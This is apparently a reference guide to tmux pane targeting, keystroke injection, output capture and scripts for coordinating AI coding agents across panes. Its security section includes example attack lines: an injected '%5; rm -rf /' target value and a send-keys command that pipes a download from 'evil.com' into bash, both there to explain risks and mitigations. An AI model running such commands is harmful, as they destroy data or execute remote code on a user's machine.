# Tmux Pane Addressing & Inter-Pane Communication

> A reference for anyone building tools that coordinate AI coding agents (Claude Code, Codex, Gemini CLI) across tmux panes.
> Every concept has a runnable command. Ctrl+F freely.

---

## Table of Contents

1. [Addressing / Targeting](#1-addressing--targeting)
2. [Discovering Addresses](#2-discovering-addresses)
3. [Sending Commands / Text to Panes](#3-sending-commands--text-to-panes)
4. [Reading Output from Panes](#4-reading-output-from-panes)
5. [Agent Coordination Patterns](#5-agent-coordination-patterns)
6. [Practical Examples for AI Agent Workflows](#6-practical-examples-for-ai-agent-workflows)
7. [Security Considerations](#7-security-considerations)

---

## 1. Addressing / Targeting

Every tmux command that operates on a session, window, or pane accepts a **target** via the `-t` flag. Targets use a hierarchical syntax: `session:window.pane`.

### Session Targets

| Syntax | Meaning |
|---|---|
| `mysession` | Session named `mysession` |
| `$0` | Session with ID `0` (assigned by tmux at creation) |
| `my` | Prefix match — works if `mysession` is the only session starting with `my` |

```bash
# Kill a session by name
tmux kill-session -t mysession

# Rename a session by its numeric ID
tmux rename-session -t '$3' new-name
```

Session IDs are prefixed with `$` in format strings (`#{session_id}` yields `$0`, `$1`, etc.).

### Window Targets

Windows are addressed as `session:window`. The window part can be a name or a zero-based index.

| Syntax | Meaning |
|---|---|
| `mysession:0` | First window (index 0) in `mysession` |
| `mysession:editor` | Window named `editor` in `mysession` |
| `mysession:$5` | Window with ID `@5` (global, unique across all sessions) |
| `:2` | Window index 2 in the **current** session |
| `mysession:^` | First window in `mysession` |
| `mysession:!` | Last (most recently active) window in `mysession` |

```bash
# Select (switch to) a specific window
tmux select-window -t mysession:2

# Rename a window
tmux rename-window -t mysession:0 code-review
```

Window IDs are prefixed with `@` in format strings (`#{window_id}` yields `@0`, `@1`, etc.).

### Pane Targets

Panes are addressed as `session:window.pane`. The pane part can be an index or a unique ID.

| Syntax | Meaning |
|---|---|
| `mysession:0.1` | Second pane (index 1) in window 0 of `mysession` |
| `%5` | Pane with unique global ID `%5` — works without session/window context |
| `:0.0` | First pane of window 0 in the current session |
| `.1` | Second pane in the current window |

```bash
# Send text to a specific pane by session:window.pane
tmux send-keys -t mysession:0.1 "echo hello" Enter

# Send text using the global pane ID (simplest for automation)
tmux send-keys -t %5 "echo hello" Enter
```

Pane IDs (`%0`, `%1`, ...) are **globally unique** across all sessions and windows. They are stable for the lifetime of the pane and are the most reliable target for automation.

### Relative Targets

These tokens resolve relative to the current pane/window. Enclose in braces.

| Token | Target |
|---|---|
| `{last}` | Last (previously active) pane |
| `{next}` | Next pane (by index) |
| `{previous}` | Previous pane (by index) |
| `{top}` | Top pane in the current layout |
| `{bottom}` | Bottom pane |
| `{left}` | Left pane |
| `{right}` | Right pane |
| `{up-of}` | Pane above |
| `{down-of}` | Pane below |

```bash
# Send "ls" to the pane on the right
tmux send-keys -t '{right}' "ls" Enter

# Capture output of the bottom pane
tmux capture-pane -t '{bottom}' -p
```

### Special Tokens

| Token | Target |
|---|---|
| `{mouse}` | Pane under the mouse (only valid in mouse-triggered bindings) |
| `{marked}` | The marked pane (set with `select-pane -m`) |

```bash
# Mark the current pane
tmux select-pane -m

# Now from any other pane, you can target the marked one
tmux send-keys -t '{marked}' "echo from marked" Enter

# Clear the mark
tmux select-pane -M
```

---

## 2. Discovering Addresses

### Listing Sessions, Windows, and Panes

```bash
# List all sessions
tmux list-sessions
# Output: mysession: 3 windows (created Mon Apr  7 10:00:00 2026)

# List windows in a session
tmux list-windows -t mysession
# Output: 0: editor* (2 panes) [200x50] [layout ...] @0

# List panes in a specific window
tmux list-panes -t mysession:0
# Output: 0: [100x50] [history 1500/50000] %0 (active)
#         1: [100x50] [history 300/50000] %1

# List ALL panes across ALL sessions
tmux list-panes -a
```

### Format Strings

Format strings (`-F`) let you extract exactly the fields you need. This is the primary API for automation.

```bash
# Get session:window.pane addresses for every pane on the server
tmux list-panes -a -F '#{session_name}:#{window_index}.#{pane_index}'
# Output:
# work:0.0
# work:0.1
# work:1.0
# agents:0.0

# Include the pane ID (most useful for automation)
tmux list-panes -a -F '#{pane_id} #{session_name}:#{window_index}.#{pane_index}'
# Output:
# %0 work:0.0
# %1 work:0.1
# %2 work:1.0
# %3 agents:0.0

# Get pane ID, command running in pane, and pane's working directory
tmux list-panes -a -F '#{pane_id} #{pane_current_command} #{pane_current_path}'
# Output:
# %0 zsh /home/user/project
# %1 node /home/user/project
# %2 claude /home/user/project
# %3 codex /home/user/other-project
```

### Commonly Used Format Variables

| Variable | Value |
|---|---|
| `#{session_name}` | Session name |
| `#{session_id}` | Session ID (`$0`, `$1`, ...) |
| `#{window_index}` | Window index (0, 1, 2, ...) |
| `#{window_name}` | Window name |
| `#{window_id}` | Window ID (`@0`, `@1`, ...) |
| `#{pane_index}` | Pane index within its window (0, 1, ...) |
| `#{pane_id}` | Global pane ID (`%0`, `%1`, ...) |
| `#{pane_pid}` | PID of the process running in the pane |
| `#{pane_current_command}` | Name of the program running in the pane |
| `#{pane_current_path}` | Working directory of the pane |
| `#{pane_width}` | Pane width in columns |
| `#{pane_height}` | Pane height in rows |
| `#{pane_active}` | `1` if pane is the active pane in its window |
| `#{pane_dead}` | `1` if the pane's process has exited |

Full list: `man tmux`, search for "FORMATS".

### Getting the Current Pane from Inside It

Every process inside tmux has the `$TMUX_PANE` environment variable set to the pane's global ID.

```bash
# Inside a tmux pane:
echo $TMUX_PANE
# Output: %3
```

This is how an agent running inside tmux can discover its own address.

### Using `display-message` for Current Context

`tmux display-message -p` prints format strings for the **current** pane without displaying anything in the status bar.

```bash
# Get current session, window, and pane
tmux display-message -p '#{session_name}:#{window_index}.#{pane_index}'
# Output: work:1.0

# Get the PID of the current pane's process
tmux display-message -p '#{pane_pid}'
# Output: 48291

# Get all context at once
tmux display-message -p 'session=#{session_name} window=#{window_index} pane=#{pane_index} id=#{pane_id} pid=#{pane_pid} cmd=#{pane_current_command}'
```

### Finding Which Pane Runs a Specific Process

To find the pane running a specific command (e.g., `codex`, `claude`):

```bash
# Find panes running "claude" by tmux's tracked command name
tmux list-panes -a -F '#{pane_id} #{pane_current_command}' | grep claude
# Output: %5 claude

# More robust: search by PID tree (finds children too)
# First find the PID of the agent
pgrep -f codex
# Then find which pane owns that PID
tmux list-panes -a -F '#{pane_id} #{pane_pid}' | while read id pid; do
  if pgrep -P "$pid" -f codex > /dev/null 2>&1; then
    echo "$id"
  fi
done

# Simplest robust approach: match the process tree
tmux list-panes -a -F '#{pane_id} #{pane_pid}' | while read pane_id pane_pid; do
  if ps -o comm= -g "$pane_pid" 2>/dev/null | grep -q codex; then
    echo "$pane_id"
  fi
done
```

Note: `#{pane_current_command}` tracks the **foreground** process. If the agent is the direct child of the shell, tmux will report the agent's name. If the agent was launched through a wrapper script, you may see the wrapper name instead and need to walk the PID tree.

---

## 3. Sending Commands / Text to Panes

### Basic Keystroke Injection

`send-keys` types characters into the target pane as if a human pressed them.

```bash
# Type "echo hello" then press Enter
tmux send-keys -t %5 "echo hello" Enter

# Each argument is a separate key event. Named keys:
#   Enter, Escape, Space, Tab, BSpace (backspace),
#   Up, Down, Left, Right, Home, End,
#   PageUp (PgUp), PageDown (PgDn),
#   F1-F12
tmux send-keys -t %5 "ls -la" Enter
```

**Important:** Without `Enter` at the end, the text is typed but not submitted. This is useful for staging a command for human review.

### Literal Mode (`-l`)

Without `-l`, tmux interprets certain strings as key names. The `-l` flag forces everything to be treated as literal text.

```bash
# WITHOUT -l: "Enter" would be interpreted as the Enter key
# This types "echo Enter" literally (does NOT press Enter)
tmux send-keys -t %5 -l "echo Enter"

# Use -- to end option parsing (prevents strings starting with - from being flags)
tmux send-keys -t %5 -l -- "--verbose flag"
```

When to use `-l`:
- When sending arbitrary user-provided text
- When the text might contain tmux key names (`Enter`, `Space`, `Escape`, etc.)
- When the text might start with `-`

### Sending Control Sequences

Control keys are written as `C-<key>`.

```bash
# Send Ctrl+C (interrupt)
tmux send-keys -t %5 C-c

# Send Ctrl+D (EOF)
tmux send-keys -t %5 C-d

# Send Ctrl+L (clear screen)
tmux send-keys -t %5 C-l

# Send Ctrl+A (beginning of line, in emacs mode)
tmux send-keys -t %5 C-a

# Send Ctrl+Z (suspend)
tmux send-keys -t %5 C-z

# Combined: interrupt the current process, then run a new command
tmux send-keys -t %5 C-c
tmux send-keys -t %5 "npm test" Enter
```

### Multiline Text via Paste Buffers

For multiline text, keystroke injection gets messy. Use tmux's paste buffer instead.

```bash
# Load text into a named buffer, then paste it into the target pane
tmux set-buffer -b mycode "def hello():\n    print('hello')\n"
tmux paste-buffer -b mycode -t %5

# Paste from stdin (pipe any content in)
echo "line one
line two
line three" | tmux load-buffer -
tmux paste-buffer -t %5

# Paste without trailing newline (-p trims it)
tmux paste-buffer -b mycode -t %5 -p

# Delete the buffer when done
tmux delete-buffer -b mycode
```

For large blocks of text (e.g., sending a file to an agent), paste buffers are more reliable and faster than `send-keys`.

```bash
# Send a file's content to a pane via paste buffer
tmux load-buffer /path/to/prompt.txt
tmux paste-buffer -t %5
tmux send-keys -t %5 Enter  # submit the pasted text
```

### Escaping Gotchas

| Scenario | Problem | Solution |
|---|---|---|
| Double quotes in text | Shell eats them | Single-quote the outer string, or escape: `\"` |
| Single quotes in text | Can't nest in single-quoted string | Use `$'...'` syntax or concatenation |
| Semicolons | Shell interprets as command separator | Quote the entire string |
| Dollar signs | Shell variable expansion | Single-quote or escape: `\$` |
| Backticks | Shell command substitution | Single-quote or escape: `` \` `` |
| Newlines | Shell eats them | Use paste buffers for multiline |
| Text starting with `-` | Parsed as tmux flag | Use `--` end-of-options marker |

```bash
# Sending a command with double quotes
tmux send-keys -t %5 'echo "hello world"' Enter

# Sending a command with single quotes
tmux send-keys -t %5 "echo 'hello world'" Enter

# Sending a command with both quote types
tmux send-keys -t %5 'echo "it'\''s working"' Enter

# Safest for arbitrary text: use -l with -- and single quotes
tmux send-keys -t %5 -l -- 'arbitrary text with "quotes" and $vars'
tmux send-keys -t %5 Enter
```

---

## 4. Reading Output from Panes

### Capture Pane Content

`capture-pane` copies the visible pane content (and scrollback) into a buffer. With `-p`, it prints directly to stdout.

```bash
# Print the current visible content of a pane
tmux capture-pane -t %5 -p

# Capture to a named buffer, then retrieve it
tmux capture-pane -t %5 -b mycapture
tmux show-buffer -b mycapture
tmux delete-buffer -b mycapture
```

### Line Range Selection

By default, `capture-pane` captures only the visible area. Use `-S` (start) and `-E` (end) to include scrollback history.

```bash
# Last 50 lines of scrollback + visible area
tmux capture-pane -t %5 -p -S -50

# Entire scrollback history (go back as far as possible)
tmux capture-pane -t %5 -p -S -

# Specific range: lines 100 through 200 from the start of history
tmux capture-pane -t %5 -p -S 100 -E 200

# Only the visible area (the default, but explicit)
tmux capture-pane -t %5 -p -S 0 -E -1
```

Line numbering: `0` is the first line of the visible area. Negative numbers go into scrollback (`-1` is the last scrollback line, `-50` is 50 lines back). `-` means "the beginning/end of all history".

### Joining Wrapped Lines (`-J`)

By default, long lines that wrap in the terminal are captured as separate lines. `-J` joins them back.

```bash
# Capture with wrapped lines joined (important for parsing output)
tmux capture-pane -t %5 -p -J -S -100

# Without -J: a 200-char line in an 80-col pane becomes 3 lines
# With -J: it's one line, as the program originally printed it
```

Always use `-J` when you want to parse the captured text programmatically.

### Including Escape Sequences (`-e`)

By default, escape sequences (colors, bold, etc.) are stripped. Use `-e` to preserve them.

```bash
# Capture with ANSI color codes included
tmux capture-pane -t %5 -p -e

# Typically you want clean text for parsing, so omit -e
# Use -e only when you need to preserve formatting for display
```

### Continuous Logging with `pipe-pane`

`pipe-pane` sends all future output of a pane to a command (typically a file).

```bash
# Start logging pane output to a file
tmux pipe-pane -t %5 'cat >> /tmp/pane5.log'

# Stop logging (run with no command)
tmux pipe-pane -t %5

# Log with timestamps (each chunk gets a timestamp)
tmux pipe-pane -t %5 'while IFS= read -r line; do echo "$(date +%H:%M:%S) $line"; done >> /tmp/pane5.log'

# Include output AND input (-I flag captures what the user types too)
tmux pipe-pane -t %5 -I 'cat >> /tmp/pane5-full.log'

# Output only (-O, the default)
tmux pipe-pane -t %5 -O 'cat >> /tmp/pane5-output.log'
```

Note: `pipe-pane` captures the **raw terminal stream**, including escape sequences. For clean text, pipe through a filter:

```bash
# Log with escape sequences stripped (requires `ansifilter` or `sed`)
tmux pipe-pane -t %5 'sed "s/\x1b\[[0-9;]*[mGKHJ]//g" >> /tmp/pane5-clean.log'
```

### Saving Buffers

```bash
# Capture a pane and save to a file in one step
tmux capture-pane -t %5 -b output -S -
tmux save-buffer -b output /tmp/pane5-snapshot.txt
tmux delete-buffer -b output
```

---

## 5. Agent Coordination Patterns

### Pattern: Send Prompt, Poll for Completion

The simplest coordination loop: send a prompt to an agent pane, then poll `capture-pane` until a known completion marker appears.

```bash
#!/usr/bin/env bash
AGENT_PANE="%5"
PROMPT="Review the file src/main.py for bugs"

# Send the prompt
tmux send-keys -t "$AGENT_PANE" "$PROMPT" Enter

# Poll until the agent's shell prompt reappears (indicating it's done)
while true; do
  output=$(tmux capture-pane -t "$AGENT_PANE" -p -J -S -5)
  # Check for shell prompt at the end (adjust pattern to your shell)
  if echo "$output" | tail -1 | grep -qE '^\$\s*$'; then
    break
  fi
  sleep 2
done

# Capture the full response
tmux capture-pane -t "$AGENT_PANE" -p -J -S -500
```

### Pattern: Nonce / Sentinel String

To reliably detect when an agent finishes, inject a unique marker after the prompt.

```bash
#!/usr/bin/env bash
AGENT_PANE="%5"
NONCE="__DONE_$(date +%s%N)__"

# Send the prompt, then echo the nonce when it completes
tmux send-keys -t "$AGENT_PANE" "claude 'Explain this codebase' && echo $NONCE" Enter

# Wait for the nonce to appear in the pane
while true; do
  if tmux capture-pane -t "$AGENT_PANE" -p -J -S - | grep -qF "$NONCE"; then
    break
  fi
  sleep 2
done

echo "Agent finished."
```

This works well for CLI agents that return to a shell prompt. For agents that remain interactive (like Claude Code in REPL mode), you need to watch the pane content for an idle indicator instead.

### Pattern: `tmux wait-for` Channel Signaling

`wait-for` provides named event channels. One process waits; another signals.

```bash
# Terminal A (coordinator): block until the agent signals
tmux wait-for agent-done
echo "Agent has completed!"

# Terminal B (or inside agent pane): signal when done
tmux wait-for -S agent-done
```

With a timeout (using background + sleep):

```bash
#!/usr/bin/env bash
CHANNEL="agent-task-$(date +%s)"

# Send work to agent
tmux send-keys -t %5 "claude 'Fix the bug' && tmux wait-for -S $CHANNEL" Enter

# Wait with timeout
timeout 300 tmux wait-for "$CHANNEL"
if [ $? -eq 124 ]; then
  echo "Agent timed out after 5 minutes"
else
  echo "Agent completed"
fi
```

### Pattern: Watching Pane Content for Specific Strings

For agents in REPL mode that don't return to a shell prompt, watch for their idle indicator.

```bash
#!/usr/bin/env bash
AGENT_PANE="%5"

# Claude Code shows a ">" prompt when idle, Codex shows "codex>"
IDLE_PATTERN='^>'

# Send a task
tmux send-keys -t "$AGENT_PANE" "Review src/auth.py for security issues" Enter

# Wait for the agent to return to its prompt
sleep 5  # initial grace period
while true; do
  last_line=$(tmux capture-pane -t "$AGENT_PANE" -p -J | tail -1)
  if echo "$last_line" | grep -qE "$IDLE_PATTERN"; then
    break
  fi
  sleep 3
done
```

### Pattern: File-Based Handoff

For more complex coordination, use the filesystem as the communication channel.

```bash
#!/usr/bin/env bash
WORK_DIR="/tmp/agent-tasks"
mkdir -p "$WORK_DIR"
TASK_FILE="$WORK_DIR/task-$(date +%s).md"
RESULT_FILE="${TASK_FILE%.md}-result.md"

# Write the task
cat > "$TASK_FILE" << 'EOF'
Review src/main.py and write your findings to the result file.
EOF

# Tell the agent to process it
tmux send-keys -t %5 "claude 'Read $TASK_FILE, do the task, write results to $RESULT_FILE'" Enter

# Wait for result file to appear
while [ ! -f "$RESULT_FILE" ]; do
  sleep 2
done

cat "$RESULT_FILE"
```

---

## 6. Practical Examples for AI Agent Workflows

### Find the Pane Running a Specific Agent

```bash
# Find all panes running "claude"
tmux list-panes -a -F '#{pane_id} #{session_name}:#{window_index}.#{pane_index} #{pane_current_command}' \
  | grep -i claude
# Output: %5 agents:0.0 claude

# Find all panes running "codex"
tmux list-panes -a -F '#{pane_id} #{session_name}:#{window_index}.#{pane_index} #{pane_current_command}' \
  | grep -i codex
# Output: %7 agents:0.1 codex

# Find panes by inspecting the full process tree (catches wrapper scripts)
for pane_info in $(tmux list-panes -a -F '#{pane_id}:#{pane_pid}'); do
  pane_id="${pane_info%%:*}"
  pane_pid="${pane_info##*:}"
  if pstree -p "$pane_pid" 2>/dev/null | grep -q codex; then
    echo "$pane_id is running codex"
  fi
done

# macOS alternative (no pstree by default, use ps)
tmux list-panes -a -F '#{pane_id} #{pane_pid}' | while read id pid; do
  if ps -o command= -p $(pgrep -P "$pid") 2>/dev/null | grep -q codex; then
    echo "$id"
  fi
done
```

### Send a Review Request and Wait for the Response

```bash
#!/usr/bin/env bash
# send-review.sh — Send a code review task to Claude Code and capture the response

CLAUDE_PANE=$(tmux list-panes -a -F '#{pane_id} #{pane_current_command}' | grep claude | head -1 | awk '{print $1}')

if [ -z "$CLAUDE_PANE" ]; then
  echo "No Claude Code pane found"
  exit 1
fi

FILE_TO_REVIEW="$1"
NONCE="__REVIEW_DONE_$(date +%s%N)__"

# Snapshot the pane's current line count so we can extract just the new output
pre_lines=$(tmux capture-pane -t "$CLAUDE_PANE" -p -J -S - | wc -l)

# Send the review request
tmux send-keys -t "$CLAUDE_PANE" "/review $FILE_TO_REVIEW" Enter

# Wait for the agent to become idle again (adjust pattern for your agent)
sleep 5
while true; do
  last_lines=$(tmux capture-pane -t "$CLAUDE_PANE" -p -J | tail -3)
  # Claude Code shows a prompt character when idle
  if echo "$last_lines" | grep -qE '^\s*>\s*$|^\s*\$\s*$'; then
    break
  fi
  sleep 3
done

# Capture just the response (everything after our prompt)
full_output=$(tmux capture-pane -t "$CLAUDE_PANE" -p -J -S -)
echo "$full_output" | tail -n +"$((pre_lines + 1))"
```

### Capture Just the Agent's Last Response

```bash
#!/usr/bin/env bash
# Capture the last response from an agent, excluding the prompt itself.
# Works by looking for the last two prompt markers and extracting between them.

PANE="$1"
PROMPT_REGEX='^\$ |^> |^claude>'  # adjust to match your agent's prompt

output=$(tmux capture-pane -t "$PANE" -p -J -S -500)

# Find the last two prompt lines and extract between them
echo "$output" | awk "
  /$PROMPT_REGEX/ { start = NR; buffer = \"\" ; next }
  { buffer = buffer \"\n\" \$0 }
  END { print buffer }
"
```

### Set Up Continuous Monitoring with `pipe-pane`

```bash
#!/usr/bin/env bash
# monitor-agents.sh — Log all agent output for later analysis

LOG_DIR="/tmp/agent-logs"
mkdir -p "$LOG_DIR"

# Start logging every agent pane
tmux list-panes -a -F '#{pane_id} #{pane_current_command}' | while read id cmd; do
  case "$cmd" in
    claude|codex|gemini)
      log_file="$LOG_DIR/${id#%}-${cmd}.log"
      tmux pipe-pane -t "$id" "cat >> '$log_file'"
      echo "Logging $id ($cmd) -> $log_file"
      ;;
  esac
done

echo "Monitoring started. Stop with: tmux pipe-pane -t <pane_id>"
```

### Broadcast a Prompt to Multiple Agent Panes

```bash
#!/usr/bin/env bash
# broadcast.sh — Send the same prompt to all agent panes

PROMPT="$*"

if [ -z "$PROMPT" ]; then
  echo "Usage: broadcast.sh <prompt text>"
  exit 1
fi

tmux list-panes -a -F '#{pane_id} #{pane_current_command}' | while read id cmd; do
  case "$cmd" in
    claude|codex|gemini)
      echo "Sending to $id ($cmd)"
      tmux send-keys -t "$id" -l -- "$PROMPT"
      tmux send-keys -t "$id" Enter
      ;;
  esac
done
```

### Gather Status from All Agents

```bash
#!/usr/bin/env bash
# agent-status.sh — Quick view of what each agent pane is doing

printf "%-8s %-10s %-20s %s\n" "PANE" "AGENT" "SESSION:WIN.PANE" "LAST LINE"
printf "%-8s %-10s %-20s %s\n" "----" "-----" "----------------" "---------"

tmux list-panes -a -F '#{pane_id} #{pane_current_command} #{session_name}:#{window_index}.#{pane_index}' \
  | while read id cmd addr; do
    case "$cmd" in
      claude|codex|gemini)
        last=$(tmux capture-pane -t "$id" -p -J | grep -v '^$' | tail -1)
        printf "%-8s %-10s %-20s %s\n" "$id" "$cmd" "$addr" "${last:0:60}"
        ;;
    esac
done
```

---

## 7. Security Considerations

### Shell Injection via Pane Targets

If pane targets or text content come from user input, an unquoted variable can execute arbitrary commands.

```bash
# DANGEROUS: unquoted variable allows injection
target="$USER_INPUT"
tmux send-keys -t $target "echo safe" Enter
# If USER_INPUT is "%5; rm -rf /", the shell splits this into multiple commands

# SAFE: always quote variables
tmux send-keys -t "$target" "echo safe" Enter
```

### The `-l` Flag and `--` for Safe Literal Text

When sending text that comes from untrusted input, always use both `-l` and `--`.

```bash
# DANGEROUS: user input could contain tmux key names or start with -
tmux send-keys -t %5 "$user_text" Enter

# SAFE: -l prevents key-name interpretation, -- prevents flag parsing
tmux send-keys -t %5 -l -- "$user_text"
tmux send-keys -t %5 Enter
```

Without `-l`, a string like `"Escape"` would send the Escape key instead of the word. Without `--`, a string like `"-t foo"` would be parsed as flags.

### Control Sequence Injection

`send-keys` can inject arbitrary terminal control sequences. A malicious payload could:
- Clear the screen (`C-l`) to hide evidence
- Send Ctrl+C to interrupt a running process
- Type and execute arbitrary shell commands

```bash
# An attacker who can call send-keys can do anything the pane's user can do.
# This is equivalent to sitting at the keyboard.
tmux send-keys -t %5 C-c
tmux send-keys -t %5 "curl evil.com/payload | bash" Enter
```

Mitigations:
- Restrict who can access the tmux socket (default: `~/.tmux-<uid>/default`)
- Use named sockets with permissions: `tmux -L mysocket new-session`
- Never expose tmux socket paths to untrusted processes

### Who Can Send to Your Panes

Any process that can connect to the tmux server's Unix socket can send commands to any pane on that server. By default, the socket is at `/tmp/tmux-<uid>/default` and is readable/writable only by the owning user.

```bash
# Check your tmux socket
echo $TMUX
# Output: /private/tmp/tmux-501/default,12,0
# The path before the first comma is the socket

# Check its permissions
ls -la /private/tmp/tmux-501/default
# Output: srwxrwx--- 1 user user 0 Apr  7 10:00 /private/tmp/tmux-501/default
```

Key facts:
- All panes on a tmux server share a single trust boundary. There is no per-pane access control.
- If you run multiple agents, they all have implicit access to each other's panes (they can all call `tmux send-keys`).
- To isolate agents from each other, run them on **separate tmux servers** with different sockets: `tmux -L server-a` and `tmux -L server-b`.

### Validating Targets Before Use

```bash
# Check that a pane target is valid before sending to it
if tmux has-session -t "$target" 2>/dev/null; then
  tmux send-keys -t "$target" -l -- "$text"
  tmux send-keys -t "$target" Enter
else
  echo "Invalid target: $target" >&2
  exit 1
fi

# For pane-level validation
if tmux display-message -t "$pane_target" -p '#{pane_id}' 2>/dev/null; then
  tmux send-keys -t "$pane_target" -l -- "$text"
  tmux send-keys -t "$pane_target" Enter
else
  echo "Pane not found: $pane_target" >&2
  exit 1
fi
```

---

## Quick Reference Card

```
TARGETS
  session_name              → session by name
  $N                        → session by ID
  session:N                 → window by index
  session:name              → window by name
  session:N.M               → pane by index
  %N                        → pane by global ID  ← best for automation

DISCOVER
  tmux list-panes -a -F '#{pane_id} #{pane_current_command}'
  echo $TMUX_PANE           ← from inside a pane
  tmux display-message -p '#{pane_id}'

SEND
  tmux send-keys -t %N "cmd" Enter              ← basic
  tmux send-keys -t %N -l -- "literal text"     ← safe
  tmux send-keys -t %N C-c                      ← control key
  tmux load-buffer file && tmux paste-buffer -t %N  ← multiline

READ
  tmux capture-pane -t %N -p -J                 ← visible area, joined
  tmux capture-pane -t %N -p -J -S -100         ← last 100 lines
  tmux capture-pane -t %N -p -J -S -            ← all history
  tmux pipe-pane -t %N 'cat >> /tmp/log'        ← continuous

COORDINATE
  tmux wait-for CHANNEL     ← block until signal
  tmux wait-for -S CHANNEL  ← send signal
```
